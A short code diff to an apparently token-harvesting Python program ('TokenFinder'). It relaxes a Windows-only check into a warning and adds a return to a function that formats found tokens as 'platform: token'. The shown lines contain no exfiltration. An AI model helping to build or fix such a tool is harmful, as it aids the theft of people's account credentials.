@@ -3,7 +3,7 @@ import re
 
 from sys import platform
 if platform != "win32":
-    raise TypeError("This program is only supported on Windows")
+    input("WARNING: This program is only supported for Windows \nThere is no gaurantee on the functionality of this program on this device. \nPress enter to continue")
 
 
 class Token:
@@ -70,6 +70,7 @@ class TokenFinder:
         for token in self.tokens:
             message += "\n"
             message += f"{token.platform}: {token.token}"
+        return message
 
 
 if __name__ == "__main__":
